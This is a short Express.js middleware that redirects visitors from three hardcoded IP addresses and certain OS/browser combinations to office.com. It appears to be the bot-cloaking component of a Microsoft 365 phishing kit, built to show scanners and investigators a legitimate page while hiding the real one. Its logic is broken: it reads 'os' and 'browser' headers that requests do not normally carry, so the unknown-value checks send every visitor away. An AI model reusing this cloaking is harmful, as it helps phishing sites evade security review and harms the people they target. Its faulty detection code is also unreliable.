const redirectUrl = "https://office.com"; // Define the redirection link

const detectBotMiddleware = (req, res, next) => {
    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || "Unknown User-Agent";
    const os = req.headers['os'] || "Unknown OS Platform"; // Replace with actual logic to detect OS if needed
    const browser = req.headers['browser'] || "Unknown Browser"; // Replace with actual logic to detect browser if needed
    
    if (
        ip === "92.23.57.168" ||
        ip === "96.31.1.4" ||
        ip === "207.96.148.8" ||
        (os === "Windows Server 2003/XP x64" && browser === "Firefox") ||
        (os === "Windows 7" && browser === "Firefox") ||
        (os === "Windows XP" && ["Firefox", "Internet Explorer", "Chrome"].includes(browser)) ||
        (os === "Windows Vista" && browser === "Internet Explorer") ||
        ["Windows Vista", "Ubuntu", "Chrome OS", "BlackBerry", "Linux"].includes(os) ||
        browser === "Internet Explorer" ||
        os === "Windows 2000" ||
        os === "Unknown OS Platform" ||
        browser === "Unknown Browser"
    ) {
        console.log(`Blocked IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
        return res.redirect(redirectUrl);
    }

    next();
};

module.exports = detectBotMiddleware; 